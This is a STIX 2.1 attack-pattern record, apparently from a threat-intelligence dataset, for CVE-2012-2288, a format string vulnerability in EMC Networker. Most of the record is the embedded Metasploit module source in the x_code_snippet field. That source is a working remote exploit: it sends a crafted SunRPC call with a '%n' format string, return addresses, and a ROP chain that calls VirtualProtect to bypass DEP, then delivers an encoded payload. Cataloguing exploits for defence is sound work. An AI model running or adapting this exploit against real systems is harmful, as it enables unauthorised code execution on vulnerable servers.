{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ce3cbbcb-e09b-4810-beef-21ea62dda867",
    "created": "2024-08-14T16:48:05.459996Z",
    "modified": "2024-08-14T16:48:05.460001Z",
    "name": "EMC Networker Format String",
    "description": " This module exploits a format string vulnerability in the lg_sprintf function as implemented in liblocal.dll on EMC Networker products. This module exploits the vulnerability by using a specially crafted RPC call to the program number 0x5F3DD version 0x02, and procedure 0x06. This module has been tested successfully on EMC Networker 7.6 SP3 on Windows XP SP3 and Windows 2003 SP2 (DEP bypass). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/emc/networker_format_string.rb",
            "external_id": "networker_format_string.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2288"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/misc/aluigi0216_story.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::SunRPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'EMC Networker Format String',\n      'Description'    => %q{\n          This module exploits a format string vulnerability in the lg_sprintf function\n        as implemented in liblocal.dll on EMC Networker products. This module exploits the\n        vulnerability by using a specially crafted RPC call to the program number 0x5F3DD,\n        version 0x02, and procedure 0x06. This module has been tested successfully on EMC\n        Networker 7.6 SP3 on Windows XP SP3 and Windows 2003 SP2 (DEP bypass).\n      },\n      'Author'         =>\n        [\n          'Aaron Portnoy', # Vulnerability Discovery and analysis\n          'Luigi Auriemma <aluigi[at]autistici.org>', # Vulnerability Discovery and analysis\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2288' ],\n          [ 'OSVDB', '85116' ],\n          [ 'BID', '55330' ],\n          [ 'URL', 'http://aluigi.altervista.org/misc/aluigi0216_story.txt' ]\n        ],\n      'Platform'       => [ 'win' ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0d\\x0a\\x25\\x2a\",\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'Targets'        =>\n        [\n          ['EMC Networker 7.6 SP3 / Windows Universal',\n            {\n              'Ret' => 0x7c354dac, # ret from MSVCR71.dll\n              'Offset' => 156,\n              'DEP' => true\n            }\n          ],\n          ['EMC Networker 7.6 SP3 / Windows XP SP3',\n            {\n              'Ret' => 0x7c345c30, # push esp # ret from MSVCR71.dll\n              'Offset' => 156,\n              'DEP' => false\n            }\n          ],\n          ['EMC Networker 7.6 SP3 / Windows 2003 SP2',\n            {\n              'Ret' => 0x7c354dac, # ret from MSVCR71.dll\n              'Offset' => 156,\n              'DEP' => true\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-08-29'))\n\n  end\n\n  def exploit\n\n    begin\n      sunrpc_create('tcp', 0x5F3DD, 2)\n\n      fs = \"%n\" * target['Offset']\n      fs << [target.ret].pack(\"V\") # push esp # ret from MSVCR71.dll\n      if target['DEP']\n        rop_gadgets =\n          [\n            # rop chain generated with mona.py\n            # The RopDb mixin isn't used because there are badchars\n            # which must be avoided\n            0x7c354dab,\t# POP EBP # RETN [MSVCR71.dll]\n            0x7c354dab,\t# skip 4 bytes [MSVCR71.dll]\n            0x7c37678f,\t# POP EAX # RETN [MSVCR71.dll]\n            0xfffffdff,\t# Value to negate, will become 0x00000201\n            0x7c34d749,\t# NEG EAX # RETN [MSVCR71.dll]\n            0x7c362688,\t# POP EBX # RETN [MSVCR71.dll]\n            0xffffffff,\t#\n            0x7c345255,\t# INC EBX # FPATAN # RETN [MSVCR71.dll]\n            0x7c363cff,\t# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN [MSVCR71.dll]\n            0x7c34592b,\t# POP EDX # RETN [MSVCR71.dll]\n            0xffffffc0,\t# Value to negate, will become 0x00000040\n            0x7c351eb1,\t# NEG EDX # RETN [MSVCR71.dll]\n            0x7c37765f,\t# POP ECX # RETN [MSVCR71.dll]\n            0x7c38ecfe,\t# &Writable location [MSVCR71.dll]\n            0x7c34a490,\t# POP EDI # RETN [MSVCR71.dll]\n            0x7c347f98,\t# RETN (ROP NOP) [MSVCR71.dll]\n            0x7c364612,\t# POP ESI # RETN [MSVCR71.dll]\n            0x7c3415a2,\t# JMP [EAX] [MSVCR71.dll]\n            0x7c344cc1,\t# POP EAX # RETN [MSVCR71.dll]\n            0x7c37a151, # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]\n            0x7c378c81,\t# PUSHAD # ADD AL,0EF # RETN [MSVCR71.dll]\n            0x7c345c30,\t# ptr to 'push esp #  ret ' [MSVCR71.dll]\n          ].pack(\"V*\")\n        fs << rop_gadgets\n      end\n      fs << payload.encoded\n\n      xdr = Rex::Encoder::XDR.encode(0, 2, rand_text_alpha(10), Rex::Encoder::XDR.encode(fs, rand_text_alpha(10)), 2)\n      sunrpc_call(6, xdr)\n      sunrpc_destroy\n\n    rescue Rex::Proto::SunRPC::RPCTimeout\n      print_error('RPCTimeout')\n    rescue EOFError\n      print_error('EOFError')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-08-29",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}